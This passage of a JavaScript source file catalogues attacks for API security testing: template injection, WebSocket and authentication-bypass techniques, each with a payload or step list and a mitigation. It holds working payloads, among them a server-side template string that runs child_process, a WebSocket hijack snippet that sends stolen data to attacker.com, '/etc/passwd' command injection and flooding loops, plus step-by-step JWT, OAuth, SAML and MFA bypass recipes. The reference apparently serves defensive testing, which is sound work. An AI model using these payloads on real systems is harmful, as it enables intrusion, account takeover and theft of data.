    description: "REST API parameters rendered through template engines (Jinja2, Freemarker, Velocity, Pebble) can execute arbitrary code when the template engine processes attacker-controlled input.",
    request: "GET /api/v1/greeting?name={{7*7}} (returns 49 = Jinja2 SSTI)\nGET /api/v1/render?template=${7*7} (returns 49 = Freemarker SSTI)\nPOST /api/v1/email -d '{\"subject\":\"{{constructor.constructor('return this.process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\")')()}}\"}'",
    mitigation: "Never pass user input directly to template engines. Use logic-less templates. Sandbox template execution. Implement template input validation. Use parameterized templates."
  },
  {
    name: "CORS Preflight Cache Poisoning",
    description: "Poisoning the CORS preflight cache with a permissive response allows subsequent cross-origin requests to bypass CORS restrictions for the duration of the Access-Control-Max-Age period.",
    request: "Attacker triggers OPTIONS request with malicious Origin during a window when CORS is misconfigured. Cache stores permissive ACAO header. Even after fix, cached preflight allows cross-origin access.",
    mitigation: "Set short Access-Control-Max-Age values. Never cache CORS preflight responses at CDN level. Implement cache purging when CORS policy changes. Monitor for CORS cache poisoning."
  },
  {
    name: "Multipart/Form-Data Boundary Injection",
    description: "Crafted multipart/form-data boundaries can confuse server-side parsers into misinterpreting field boundaries, potentially injecting extra fields or file content into other parameters.",
    request: "POST /api/v1/upload HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBound\r\n\r\n------WebKitFormBound\r\nContent-Disposition: form-data; name=\"file\"; filename=\"safe.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n(file content containing ------WebKitFormBound\\r\\nContent-Disposition: form-data; name=\"role\"\\r\\n\\r\\nadmin)",
    mitigation: "Use secure multipart parsing libraries. Validate boundary uniqueness. Do not construct boundaries from user input. Implement strict multipart parsing that rejects malformed boundaries."
  },
  {
    name: "HTTP/2 Specific Attacks (HPACK Bomb)",
    description: "HTTP/2 header compression (HPACK) can be exploited by sending headers that decompress into extremely large values, exhausting server memory. Pseudo-headers can also be manipulated.",
    request: "HTTP/2 frame with HPACK-encoded headers that decompress to megabytes of header data. Or: manipulate :authority pseudo-header for host-based routing bypass.",
    mitigation: "Set HTTP/2 header size limits. Limit the HPACK dynamic table size. Implement connection-level memory limits. Monitor for abnormal HTTP/2 header patterns."
  },
  {
    name: "Trailer Header Injection",
    description: "HTTP trailer headers sent after chunked transfer-encoded body may bypass security middleware that only inspects initial headers, allowing injection of auth or routing headers.",
    request: "POST /api/v1/data HTTP/1.1\r\nTransfer-Encoding: chunked\r\nTrailer: X-Admin-Access\r\n\r\n5\r\nHello\r\n0\r\nX-Admin-Access: true\r\n\r\n",
    mitigation: "Do not process trailer headers for security decisions. Explicitly ignore or strip trailer headers. Ensure middleware checks trailers if they influence routing or auth."
  }
];


// ----------------------------------------------------------------------------
// 5. WEBSOCKET_ATTACKS -- WebSocket-Specific Attack Vectors
// ----------------------------------------------------------------------------

const WEBSOCKET_ATTACKS = [
  {
    name: "Cross-Site WebSocket Hijacking (CSWSH)",
    description: "WebSocket connections inherit cookies from the browser. If the server does not validate the Origin header during the handshake, an attacker's page can establish an authenticated WebSocket to the target.",
    payload: "var ws = new WebSocket('wss://api.target.com/ws'); ws.onmessage = function(e) { fetch('https://attacker.com/steal?data=' + btoa(e.data)); }; ws.onopen = function() { ws.send(JSON.stringify({action: 'get_profile'})); };",
    mitigation: "Validate the Origin header during WebSocket handshake. Use CSRF tokens in the WebSocket connection URL or initial message. Implement per-connection authentication tokens. Do not rely solely on cookies for WebSocket authentication."
  },
  {
    name: "WebSocket Authentication Bypass",
    description: "WebSocket endpoints may skip authentication entirely or only validate credentials during the initial handshake without re-checking for subsequent messages.",
    payload: "// Connect without auth: var ws = new WebSocket('wss://api.target.com/ws'); ws.onopen = function() { ws.send(JSON.stringify({action: 'admin_action', target: 'all_users'})); };",
    mitigation: "Require authentication token in the WebSocket handshake. Re-validate tokens periodically during long-lived connections. Close connections when tokens expire or are revoked."
  },
  {
    name: "WebSocket Message Injection",
    description: "Lack of input validation on WebSocket messages allows injection of malicious payloads (XSS, SQL injection, command injection) through the WebSocket channel.",
    payload: "ws.send(JSON.stringify({message: '<img src=x onerror=alert(document.cookie)>'})); ws.send(JSON.stringify({query: \"' UNION SELECT password FROM users--\"})); ws.send(JSON.stringify({cmd: 'ls; cat /etc/passwd'}));",
    mitigation: "Validate and sanitize all WebSocket message content. Apply the same input validation as HTTP endpoints. Use parameterized queries for any database operations. Encode output before rendering."
  },
  {
    name: "WebSocket DoS via Connection Flooding",
    description: "Opening thousands of WebSocket connections exhausts server resources (file descriptors, memory, CPU) causing denial of service for legitimate users.",
    payload: "for (let i = 0; i < 10000; i++) { new WebSocket('wss://api.target.com/ws'); } // Or using wscat/websocat in parallel",
    mitigation: "Limit concurrent WebSocket connections per IP and per user. Implement connection rate limiting. Set maximum connection duration. Use connection queuing. Monitor for connection flooding patterns."
  },
  {
    name: "WebSocket DoS via Large Message",
    description: "Sending extremely large WebSocket messages can exhaust server memory when the server buffers the entire message before processing.",
    payload: "ws.send('A'.repeat(100 * 1024 * 1024)); // 100MB message\n// Or send continuous stream without pause",
    mitigation: "Set maximum message size limits. Implement streaming message processing. Reject messages exceeding size limits. Monitor memory usage per connection."
  },
  {
    name: "WebSocket Message Tampering (MITM)",
    description: "WebSocket connections over ws:// (unencrypted) allow man-in-the-middle attackers to read and modify messages in transit, including authentication tokens and sensitive data.",
    payload: "// MITM proxy intercepts ws:// traffic\n// Modify messages: change {action: 'transfer', amount: 10} to {action: 'transfer', amount: 10000}\n// Inject messages: send unauthorized commands",
    mitigation: "Always use wss:// (WebSocket Secure) for encrypted connections. Implement message-level signing (HMAC) for integrity verification. Use certificate pinning for mobile clients."
  },
  {
    name: "WebSocket Authorization Bypass via Channel Subscription",
    description: "WebSocket pub/sub implementations may not verify authorization when clients subscribe to channels, allowing access to private channels or other users' event streams.",
    payload: "ws.send(JSON.stringify({action: 'subscribe', channel: 'admin-notifications'})); ws.send(JSON.stringify({action: 'subscribe', channel: 'user-12345-private'})); ws.send(JSON.stringify({action: 'subscribe', channel: 'payments-stream'}));",
    mitigation: "Validate authorization for every channel subscription. Implement per-channel access control lists. Re-check authorization when channel permissions change. Audit subscription patterns."
  },
  {
    name: "WebSocket Race Condition Exploitation",
    description: "Sending multiple WebSocket messages simultaneously can exploit race conditions in server-side processing, such as double-spending, duplicate operations, or inconsistent state updates.",
    payload: "// Send 100 transfer messages simultaneously\nfor (let i = 0; i < 100; i++) { ws.send(JSON.stringify({action: 'transfer', amount: balance, to: 'attacker'})); }",
    mitigation: "Implement message queuing and sequential processing per user. Use database transactions for state-changing operations. Implement idempotency keys for WebSocket operations. Use optimistic locking."
  },
  {
    name: "WebSocket Upgrade Header Smuggling",
    description: "Manipulating the Upgrade header or WebSocket handshake parameters can bypass security middleware that does not inspect WebSocket upgrade requests the same way as regular HTTP requests.",
    payload: "GET /ws HTTP/1.1\r\nHost: target.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZQ==\r\nOrigin: https://evil.com\r\nSec-WebSocket-Protocol: admin-protocol\r\nSec-WebSocket-Version: 13",
    mitigation: "Apply security middleware to WebSocket upgrade requests. Validate all WebSocket handshake headers. Restrict allowed Sec-WebSocket-Protocol values. Implement the same security checks as HTTP endpoints."
  },
  {
    name: "WebSocket Ping/Pong Abuse",
    description: "WebSocket ping/pong frames can be abused to keep connections alive indefinitely, bypass idle timeouts, or exhaust server resources through rapid ping flooding.",
    payload: "// Send pings rapidly to prevent idle timeout and consume server resources\nsetInterval(() => { ws.send(new Uint8Array([0x89, 0x00])); }, 10); // Raw ping frame every 10ms",
    mitigation: "Rate limit ping frames. Implement maximum connection duration regardless of activity. Set limits on ping frame frequency. Close connections that send excessive pings."
  },
  {
    name: "WebSocket Subprotocol Downgrade",
    description: "The client can request a less secure WebSocket subprotocol. If the server supports multiple protocols with different security levels, the attacker can force negotiation to the weakest one.",
    payload: "var ws = new WebSocket('wss://api.target.com/ws', ['v1-no-auth', 'v2-basic', 'v3-full-auth']); // Server picks first supported, attacker lists weakest first",
    mitigation: "Only support secure subprotocols. Enforce minimum security requirements regardless of negotiated protocol. Remove deprecated or insecure protocol versions."
  },
  {
    name: "WebSocket Binary Frame Exploitation",
    description: "WebSocket binary frames may bypass text-based security filters. Servers expecting JSON text frames may not validate binary data, leading to deserialization or buffer overflow vulnerabilities.",
    payload: "// Send binary data where text JSON is expected\nws.send(new Uint8Array([0xDE, 0xAD, 0xBE, 0xEF, ...])); // Malformed binary\nws.send(new Blob([serialized_exploit_payload])); // Serialization attack via binary frame",
    mitigation: "Validate frame types (text vs binary). Apply security checks to both text and binary frames. Implement strict deserialization for binary data. Reject unexpected frame types."
  },
  {
    name: "WebSocket Session Fixation",
    description: "If WebSocket session tokens can be set by the client during the handshake, an attacker can fixate a session and hijack it after the victim authenticates over the same WebSocket.",
    payload: "// Attacker opens WS with fixed session: new WebSocket('wss://target.com/ws?session=fixed_token')\n// Victim is tricked into using same session token\n// Attacker reconnects with fixed_token and has victim's session",
    mitigation: "Generate session tokens server-side during WebSocket handshake. Never accept client-supplied session identifiers. Regenerate sessions after authentication. Bind sessions to connection metadata."
  },
  {
    name: "WebSocket Tunneling for Firewall Bypass",
    description: "WebSocket connections can tunnel arbitrary TCP traffic through firewalls and proxies that allow HTTPS traffic, enabling access to internal services or data exfiltration.",
    payload: "// Establish WebSocket to allowed target, then tunnel:\nws.send(JSON.stringify({action: 'connect', host: '10.0.0.5', port: 22}));\n// Forward SSH traffic through WebSocket tunnel\n// Tools: wstunnel, chisel, websocat",
    mitigation: "Monitor WebSocket traffic patterns for tunneling. Implement deep packet inspection on WebSocket traffic. Limit WebSocket payload types and sizes. Block known tunneling tools and patterns."
  },
  {
    name: "WebSocket Event Replay Attack",
    description: "Recording and replaying WebSocket messages can duplicate transactions, bypass one-time operations, or re-execute time-sensitive actions after their intended window.",
    payload: "// Record: {action: 'approve_payment', payment_id: '123', token: 'one-time-token'}\n// Replay the same message multiple times\n// Each replay processes the payment again if no replay protection",
    mitigation: "Implement message nonces or sequence numbers. Use timestamps with short validity windows. Mark one-time tokens as used immediately. Implement idempotency at the operation level."
  },
  {
    name: "WebSocket Fragmentation Attack",
    description: "WebSocket protocol supports message fragmentation across multiple frames. Malicious fragmentation patterns can bypass security filters that only inspect complete messages or individual frames.",
    payload: "// Fragment a malicious payload across frames:\n// Frame 1 (FIN=0): '<scri'\n// Frame 2 (FIN=0): 'pt>al'\n// Frame 3 (FIN=1): 'ert(1)</script>'\n// Security filter sees fragments, not the assembled XSS payload",
    mitigation: "Reassemble fragmented messages before security inspection. Set maximum fragment count limits. Implement timeouts for incomplete fragmented messages. Validate both individual fragments and assembled messages."
  },
  {
    name: "WebSocket Extension Abuse (permessage-deflate)",
    description: "The permessage-deflate extension compresses WebSocket messages. Malicious clients can send 'compression bombs' -- small compressed messages that expand to gigabytes, exhausting server memory.",
    payload: "// Craft a permessage-deflate compressed message:\n// Compressed size: 1KB\n// Decompressed size: 1GB+ (zlib bomb pattern)\n// Server decompresses into memory before processing",
    mitigation: "Set maximum decompressed message size limits. Implement streaming decompression with size checks. Limit compression context memory. Monitor for compression ratio anomalies."
  },
  {
    name: "WebSocket to HTTP Downgrade",
    description: "Forcing a WebSocket connection to fall back to HTTP polling (e.g., by blocking the Upgrade header) may expose the application to HTTP-specific vulnerabilities that WebSocket avoids.",
    payload: "// Proxy strips Upgrade header, forcing HTTP long-polling fallback\n// HTTP fallback may use cookies (CSRF-vulnerable) instead of WS tokens\n// HTTP fallback may lack the same rate limiting as WebSocket",
    mitigation: "Require WebSocket connections; do not implement HTTP fallback for security-sensitive features. If fallback is needed, apply equivalent security controls. Detect and alert on forced downgrades."
  },
  {
    name: "WebSocket State Manipulation via Reconnection",
    description: "Disconnecting and reconnecting WebSocket connections can manipulate server-side state machines. If the server does not properly handle reconnection, attackers can skip states or reset progress.",
    payload: "// Connect, start multi-step process (step 1 of 3)\n// Disconnect before step 2 (validation step)\n// Reconnect and send step 3 message directly\n// Server may accept step 3 without step 2 validation",
    mitigation: "Persist state machine progress server-side. Validate current state before processing any message. Do not allow state progression without completing prerequisites. Reset state on unexpected disconnection."
  },
  {
    name: "Concurrent WebSocket Session Abuse",
    description: "Opening multiple WebSocket connections with the same credentials can bypass per-connection rate limits, duplicate resources, or cause inconsistent state when actions conflict across connections.",
    payload: "// Open 50 concurrent connections with same token\n// Each connection sends a 'claim reward' message\n// Race condition: reward claimed 50 times instead of once\nfor (let i = 0; i < 50; i++) { let ws = new WebSocket('wss://target/ws?token=valid'); ws.onopen = () => ws.send('{\"action\":\"claim\"}'); }",
    mitigation: "Limit concurrent WebSocket connections per user/session. Implement per-user rate limiting across connections. Use distributed locks for exclusive operations. Monitor for unusual connection patterns."
  }
];


// ----------------------------------------------------------------------------
// 6. AUTH_BYPASS -- Authentication/Authorization Bypass Techniques
// ----------------------------------------------------------------------------

const AUTH_BYPASS = [

  // ── JWT Attacks ──

  {
    name: "JWT None Algorithm Bypass",
    description: "Forge JWT tokens by setting the algorithm to 'none' and removing the signature. Vulnerable libraries accept unsigned tokens.",
    steps: [
      "Obtain a valid JWT token",
      "Decode the header (base64url)",
      "Change the 'alg' field to 'none' (try None, NONE, nOnE variants)",
      "Modify the payload as desired (set admin role, change user ID)",
      "Remove the signature (everything after the last dot, but keep the trailing dot)",
      "Submit the forged token"
    ],
    tools: ["jwt_tool", "jwt.io", "python PyJWT library", "Burp Suite JWT plugin", "jwt-cracker"]
  },
  {
    name: "JWT Algorithm Confusion (RS256 -> HS256)",
    description: "When the server uses RS256 (asymmetric), switch to HS256 (symmetric) and sign with the RSA public key. The server may use the public key as the HMAC secret.",
    steps: [
      "Obtain the server's RSA public key (JWKS endpoint, SSL cert, etc.)",
      "Decode the JWT and change alg from RS256 to HS256",
      "Modify the payload claims as needed",
      "Sign the token using HMAC-SHA256 with the public key as the secret",
      "Submit the forged token"
    ],
    tools: ["jwt_tool -X k", "python jwt library", "portswigger/jwt-algorithm-confusion", "Burp JWT Editor"]
  },
  {
    name: "JWT Secret Key Brute Force",
    description: "Brute force weak HMAC signing secrets. Many applications use short, dictionary-based secrets for JWT signing.",
    steps: [
      "Capture a valid JWT token",
      "Use a wordlist of common secrets (password, secret, key, etc.)",
      "For each candidate secret, compute HMAC-SHA256 of header.payload",
      "Compare with the token's signature",
      "If matched, forge new tokens with the discovered secret"
    ],
    tools: ["jwt_tool -C -d wordlist.txt", "hashcat -m 16500", "john --format=HMAC-SHA256", "jwt-cracker", "c-jwt-cracker"]
  },
  {
    name: "JWT JKU/X5U Header Injection",
    description: "The jku (JWK Set URL) and x5u (X.509 URL) header parameters tell the server where to fetch the verification key. An attacker can point these to their own server hosting a key they control.",
    steps: [
      "Generate a new RSA key pair",
      "Host the public key at an attacker-controlled URL as a JWK Set",
      "Modify the JWT header to include jku pointing to attacker URL",
      "Sign the modified payload with the attacker's private key",
      "Submit the token -- server fetches and trusts the attacker's key"
    ],
    tools: ["jwt_tool -X s -ju attacker_url", "mkjwk.org", "python-jose", "Burp JWT Editor"]
  },
  {
    name: "JWT KID (Key ID) Injection",
    description: "The kid header parameter identifies which key to use for verification. If it is used in a file path or database query, it may be vulnerable to path traversal or SQL injection.",
    steps: [
      "Examine the JWT header for a kid parameter",
      "Test path traversal: kid = '../../../dev/null' (sign with empty string)",
      "Test SQL injection: kid = \"' UNION SELECT 'known_secret' --\"",
      "Test OS command injection: kid = '| cat /etc/passwd'",
      "Sign the token with the value the server will retrieve"
    ],
    tools: ["jwt_tool -X i -hc kid -hv payloads", "Burp Suite", "custom Python scripts"]
  },
  {
    name: "JWT Token Substitution",
    description: "Use a JWT token obtained from one application or endpoint on a different application that shares the same signing key or does not validate the audience claim.",
    steps: [
      "Obtain a JWT from Application A (low-privilege or different app)",
      "Decode and examine the claims (aud, iss, scope)",
      "Submit the token to Application B's API",
      "Check if Application B accepts the token without validating aud/iss",
      "If accepted, you have cross-application access"
    ],
    tools: ["jwt.io", "jwt_tool", "Burp Suite Repeater", "curl"]
  },
  {
    name: "JWT Claim Manipulation",
    description: "Modify JWT claims (sub, role, email, permissions) while using a weak or leaked signing key to forge tokens with elevated privileges.",
    steps: [
      "Decode the JWT payload",
      "Identify privilege-related claims: role, admin, permissions, scope",
      "Modify these claims: set role to admin, permissions to all",
      "Re-sign with a cracked or leaked secret",
      "Submit the forged token"
    ],
    tools: ["jwt.io", "jwt_tool", "python jwt.encode()", "Burp JWT Editor"]
  },
  {
    name: "JWT Signature Stripping",
    description: "Some implementations only check if a signature is present but do not verify it. Remove the signature or replace it with an invalid one to test.",
    steps: [
      "Take a valid JWT: header.payload.signature",
      "Replace the signature with invalid data: header.payload.invalidsig",
      "Try with a truncated signature: header.payload.sig (only first few chars)",
      "Try with an empty signature: header.payload.",
      "Submit and check if the token is still accepted"
    ],
    tools: ["jwt_tool", "Burp Suite", "curl", "manual base64url manipulation"]
  },

  // ── OAuth Attacks ──

  {
    name: "OAuth Authorization Code Interception",
    description: "Intercept the OAuth authorization code during the redirect back to the client application. If PKCE is not used and the redirect URI is not strictly validated, codes can be stolen.",
    steps: [
      "Identify the OAuth redirect URI pattern",
      "Test open redirect in the redirect_uri parameter",
      "Register a similar redirect URI on a domain you control",
      "Trick the victim into initiating the OAuth flow with your redirect_uri",
      "Capture the authorization code from the redirected request",
      "Exchange the code for an access token"
    ],
    tools: ["Burp Suite", "mitmproxy", "custom phishing page", "OAuth security scanner"]
  },
  {
    name: "OAuth CSRF / State Parameter Bypass",
    description: "If the OAuth flow does not use or validate the state parameter, an attacker can forge authorization requests to link their OAuth account to the victim's application account.",
    steps: [
      "Initiate an OAuth flow and obtain an authorization code linked to attacker account",
      "Do not complete the flow (do not use the callback URL)",
      "Send the callback URL (with attacker's code) to the victim",
      "Victim's browser completes the flow, linking attacker's OAuth to victim's account",
      "Attacker can now login to victim's account via OAuth"
    ],
    tools: ["Burp Suite", "browser developer tools", "social engineering"]
  },
  {
    name: "OAuth Token Theft via Open Redirect",
    description: "In the implicit flow, the access token is in the URL fragment. An open redirect in the redirect_uri can expose the token to an attacker-controlled page.",
    steps: [
      "Find an open redirect on the target's domain",
      "Set redirect_uri to the open redirect, which redirects to attacker's site",
      "The browser appends the fragment (with token) to the redirect",
      "Attacker's page captures the token from the URL fragment via JavaScript",
      "Use the stolen token to access the victim's resources"
    ],
    tools: ["Burp Suite", "open redirect scanner", "custom JavaScript capture page"]
  },
  {
    name: "OAuth Scope Escalation",
    description: "Request more OAuth scopes than the user approved, or escalate scope by modifying the scope parameter in subsequent requests.",
    steps: [
      "Initiate OAuth flow with minimal scopes",
      "Intercept the authorization request",
      "Add additional scopes: admin, write, delete, user.email, etc.",
      "Check if the authorization server grants the additional scopes",
      "Test if the API enforces scope restrictions on token usage"
    ],
    tools: ["Burp Suite", "OAuth Playground", "curl", "Postman"]
  },
  {
    name: "OAuth Client Secret Exposure",
    description: "Client secrets embedded in mobile apps, SPAs, or public repositories can be extracted and used to impersonate the legitimate client application.",
    steps: [
      "Decompile mobile app (APK/IPA) and search for client_secret",
      "Search JavaScript bundles for OAuth client credentials",
      "Search GitHub/GitLab for the organization's client secrets",
      "Use the extracted client_secret to obtain tokens",
      "Impersonate the legitimate application"
    ],
    tools: ["apktool", "jadx", "grep/ripgrep", "trufflehog", "git-secrets", "GitHub search"]
  },
  {
    name: "OAuth Token Reuse Across Services",
    description: "OAuth tokens obtained from one service may be accepted by other services using the same identity provider if audience validation is not enforced.",
    steps: [
      "Obtain an OAuth token from Service A (legitimate)",
      "Present this token to Service B's API",
      "Check if Service B accepts the token without audience validation",
      "If accepted, access Service B's resources using Service A's token",
      "Test with tokens from different tenants of the same IdP"
    ],
    tools: ["curl", "Burp Suite", "Postman", "OAuth token decoder"]
  },
  {
    name: "OAuth Refresh Token Theft",
    description: "Refresh tokens with long lifetimes stored insecurely (localStorage, shared preferences, logs) can be stolen and used to generate new access tokens indefinitely.",
    steps: [
      "Identify where refresh tokens are stored (XSS to access localStorage)",
      "Check if refresh tokens are in URL parameters or logs",
      "Steal a refresh token through XSS, log access, or device compromise",
      "Use the refresh token to obtain new access tokens",
      "Check if refresh tokens are rotated (one-time use)"
    ],
    tools: ["Browser developer tools", "XSS exploitation", "log file analysis", "curl"]
  },
  {
    name: "OAuth Redirect URI Manipulation",
    description: "Weak redirect URI validation allows bypasses through subdomain matching, path traversal, fragment injection, or parameter pollution to redirect tokens to attacker-controlled endpoints.",
    steps: [
      "Test redirect_uri with different subdomains: evil.target.com",
      "Test with path additions: target.com/callback/../attacker",
      "Test with parameter pollution: target.com/callback?next=evil.com",
      "Test with URL encoding: target.com%40evil.com",
      "Test with fragment: target.com/callback#@evil.com"
    ],
    tools: ["Burp Suite", "redirect URI fuzzer", "OAuth security checklist"]
  },

  // ── SAML Attacks ──

  {
    name: "SAML Signature Wrapping (XSW)",
    description: "XML Signature Wrapping attacks move the signed element and add a malicious unsigned element that the application processes instead of the signed one.",
    steps: [
      "Intercept a valid SAML response",
      "Clone the signed assertion",
      "Move the original signed assertion into an insignificant location",
      "Replace the processed assertion with a modified copy (changed user/role)",
      "Submit the modified response -- signature validates on original, app processes modified"
    ],
    tools: ["SAML Raider (Burp extension)", "saml2-tools", "xml-signature-wrapping-tool", "manual XML editing"]
  },
  {
    name: "SAML Assertion Replay",
    description: "SAML assertions without proper expiration checks or one-time-use validation can be replayed to re-authenticate as the original user.",
    steps: [
      "Capture a valid SAML assertion during authentication",
      "Wait for the session to expire",
      "Replay the captured SAML assertion to the Service Provider",
      "Check if the SP accepts the replayed assertion",
      "Test with assertions of varying ages"
    ],
    tools: ["Burp Suite", "SAML Raider", "curl", "browser developer tools"]
  },
  {
    name: "SAML XXE Injection",
    description: "SAML uses XML, and if the XML parser processes external entities, attackers can inject XXE payloads into SAML messages to read files, perform SSRF, or cause DoS.",
    steps: [
      "Intercept a SAML request or response",
      "Inject an XML DOCTYPE declaration with external entity",
      "Reference the entity in a SAML field (NameID, attribute value)",
      "Submit and check if the entity is resolved",
      "Test file:// and http:// protocols"
    ],
    tools: ["SAML Raider", "Burp Suite", "manual XML editing", "XXE payloads list"]
  },
  {
    name: "SAML Response Tampering",
    description: "Modify unsigned portions of a SAML response (e.g., NameID, role attributes, Destination, AudienceRestriction) to escalate privileges or impersonate other users.",
    steps: [
      "Capture a valid SAML response",
      "Identify which elements are inside the signed assertion",
      "Modify unsigned elements: Destination, InResponseTo, or unsigned attributes",
      "If only the assertion is signed, modify the outer response elements",
      "Submit the modified response"
    ],
    tools: ["SAML Raider", "Burp Suite", "saml-decoder", "manual XML editing"]
  },
  {
    name: "SAML Certificate Confusion",
    description: "Register a malicious Identity Provider certificate with the Service Provider, or exploit SP misconfiguration that accepts any certificate for signature validation.",
    steps: [
      "Generate a self-signed certificate",
      "Check if the SP validates the certificate against a trusted list",
      "Attempt to register the certificate as a new IdP",
      "Sign a forged SAML assertion with the self-signed cert",
      "Submit to the SP and check if it accepts the assertion"
    ],
    tools: ["OpenSSL", "xmlsec1", "SAML Raider", "custom SAML response generator"]
  },
  {
    name: "SAML NameID Manipulation",
    description: "The NameID in a SAML assertion identifies the authenticated user. If the SP does not verify the NameID against the IdP's signed assertion, it can be manipulated to impersonate other users.",
    steps: [
      "Capture a valid SAML response",
      "Locate the NameID element within the assertion",
      "Change the NameID value to the target user's identifier",
      "If the assertion is signed, attempt signature wrapping",
      "Submit the modified response to the SP"
    ],
    tools: ["SAML Raider", "Burp Suite", "manual XML editing"]
  },

  // ── API Key Attacks ──

  {
    name: "API Key Extraction from Client-Side Code",
    description: "API keys embedded in JavaScript, mobile apps, or client-side configurations can be extracted and used without authorization.",
    steps: [
      "View page source and search for API key patterns",
      "Search JavaScript bundles for key-like strings (api_key, apiKey, x-api-key)",
      "Decompile mobile apps and search for hardcoded keys",
      "Check browser developer tools Network tab for API key headers",
      "Search browser localStorage and sessionStorage for keys"
    ],
    tools: ["grep", "ripgrep", "apktool", "jadx", "browser dev tools", "trufflehog", "gitleaks"]
  },
  {
    name: "API Key Leakage in Version Control",
    description: "API keys committed to version control (Git, SVN) can be found in repository history even after removal from the current code.",
    steps: [
      "Search public repositories for the organization's API keys",
      "Check git history: git log -p | grep -i 'api.key\\|secret\\|token'",
      "Search .env, config files, and setup scripts in repositories",
      "Use automated tools to scan commit history",
      "Check CI/CD pipeline configurations for exposed secrets"
    ],
    tools: ["trufflehog", "gitleaks", "git-secrets", "gitrob", "GitHub advanced search", "shhgit"]
  },
  {
    name: "API Key Scope Abuse",
    description: "API keys with overly broad permissions allow access to resources or operations beyond what the key was intended for.",
    steps: [
      "Obtain an API key (from client code, documentation, or leaked)",
      "Enumerate accessible endpoints by trying different API paths",
      "Test administrative operations with the key",
      "Check if the key grants cross-tenant access",
      "Test if the key works across different environments (dev, staging, prod)"
    ],
    tools: ["curl", "Postman", "Burp Suite", "custom enumeration scripts"]
  },
  {
    name: "API Key in URL Referrer Leakage",
    description: "API keys passed as URL parameters are included in the Referer header when the browser navigates to external links, leaking the key to third parties.",
    steps: [
      "Identify API calls that include keys in URL parameters",
      "Navigate to an external link from the page making the API call",
      "Check the Referer header sent to the external site",
      "Set up a test server to capture Referer headers",
      "Verify the API key appears in the captured Referer"
    ],
    tools: ["Browser developer tools", "Burp Suite", "custom HTTP server for Referer capture"]
  },
  {
    name: "API Key Brute Force via Weak Generation",
    description: "API keys generated with weak randomness, short length, or predictable patterns can be brute-forced or guessed.",
    steps: [
      "Generate multiple API keys and analyze the pattern",
      "Check key length and character set",
      "Look for sequential, timestamp-based, or base-encoded patterns",
      "Calculate the keyspace and feasibility of brute force",
      "Attempt brute force with likely key patterns"
    ],
    tools: ["Custom scripts", "Burp Intruder", "hashcat", "pattern analysis"]
  },

  // ── Session Attacks ──

  {
    name: "Session Token Prediction",
    description: "Predict session tokens generated with weak randomness by analyzing patterns in multiple tokens to identify the generation algorithm.",
    steps: [
      "Collect 100+ session tokens from the target",
      "Analyze for patterns: sequential, time-based, encoded values",
      "Check entropy using statistical analysis tools",
      "Attempt to predict the next token",
      "Validate predictions against actual tokens"
    ],
    tools: ["Burp Sequencer", "custom Python analysis scripts", "NIST statistical test suite"]
  },
  {
    name: "Session Fixation Attack",
    description: "Set a known session token for the victim before authentication. After the victim logs in, the attacker uses the pre-set token to access the authenticated session.",
    steps: [
      "Obtain a valid unauthenticated session token",
      "Set this token in the victim's browser (via XSS, URL parameter, or subdomain cookie)",
      "Wait for or trick the victim into authenticating",
      "Use the same token to access the victim's session",
      "Verify the session was not regenerated after authentication"
    ],
    tools: ["Burp Suite", "browser developer tools", "custom phishing page"]
  },
  {
    name: "Session Hijacking via Token Leakage",
    description: "Session tokens exposed in URLs, logs, error messages, or through XSS can be captured and used to hijack active sessions.",
    steps: [
      "Check if session tokens appear in URLs (GET parameters)",
      "Check server logs for session token exposure",
      "Look for XSS vulnerabilities that can read cookies or tokens",
      "Check Referer headers for token leakage",
      "Monitor network traffic for unencrypted token transmission"
    ],
    tools: ["Burp Suite", "browser developer tools", "XSS scanner", "log analyzer"]
  },
  {
    name: "Cookie Manipulation for Auth Bypass",
    description: "Modify cookie values used for authentication or authorization to escalate privileges or bypass access controls.",
    steps: [
      "Examine all cookies set by the application",
      "Identify auth-related cookies (session, role, admin, user_type)",
      "Decode cookie values (base64, URL encoding, JSON)",
      "Modify values: change role=user to role=admin",
      "Test with modified cookies"
    ],
    tools: ["Browser developer tools", "EditThisCookie extension", "Burp Suite", "curl"]
  },
  {
    name: "Concurrent Session Exploitation",
    description: "Applications that do not limit concurrent sessions allow an attacker with a stolen session to maintain access even after the legitimate user changes their password or logs out elsewhere.",
    steps: [
      "Authenticate and save the session token",
      "From a different device/browser, authenticate again",
      "Check if both sessions remain active simultaneously",
      "Change password from one session",
      "Check if the other session is still valid",
      "Log out from one session and check the other"
    ],
    tools: ["Multiple browsers", "curl", "Burp Suite"]
  },

  // ── Multi-Factor Authentication Bypass ──

  {
    name: "MFA Brute Force",
    description: "Brute force the MFA code (TOTP or SMS OTP) when rate limiting is insufficient or absent, allowing enumeration of valid codes.",
    steps: [
      "Trigger MFA code generation (login with valid credentials)",
      "Identify the code format (6-digit TOTP = 1,000,000 possibilities)",
      "Send rapid MFA verification requests with incremented codes",
      "Check for rate limiting and account lockout",
      "Calculate time to brute force given response time and code validity window"
    ],
    tools: ["Burp Intruder", "custom scripts", "turbo-intruder", "ffuf"]
  },
  {
    name: "MFA Bypass via Direct API Access",
    description: "API endpoints that do not enforce MFA verification can be accessed directly, bypassing the MFA challenge that is only enforced in the web UI.",
    steps: [
      "Authenticate with username/password to get a pre-MFA token",
      "Instead of completing MFA, try accessing API endpoints directly",
      "Check if the pre-MFA token grants access to protected resources",
      "Test mobile API endpoints that may skip MFA",
      "Check older API versions that predate MFA implementation"
    ],
    tools: ["curl", "Postman", "Burp Suite", "API documentation"]
  },
  {
    name: "MFA Bypass via Response Manipulation",
    description: "Modify the server's MFA verification response to indicate success when the actual check failed. Some implementations rely on client-side response handling.",
    steps: [
      "Submit an incorrect MFA code",
      "Intercept the response (e.g., {\"success\": false, \"error\": \"invalid_code\"})",
      "Modify the response to indicate success: {\"success\": true}",
      "Check if the client application grants access based on the modified response",
      "Also try modifying status codes (403 -> 200)"
    ],
    tools: ["Burp Suite (response modification)", "mitmproxy", "browser developer tools"]
  },
  {
    name: "MFA Bypass via Backup Code Abuse",
    description: "Backup/recovery codes for MFA may have weaker security: no rate limiting, longer validity, no usage tracking, allowing brute force or reuse.",
    steps: [
      "Check if backup codes are offered as MFA alternative",
      "Test rate limiting on backup code verification",
      "Check if backup codes are single-use",
      "Test if used backup codes are rejected on reuse",
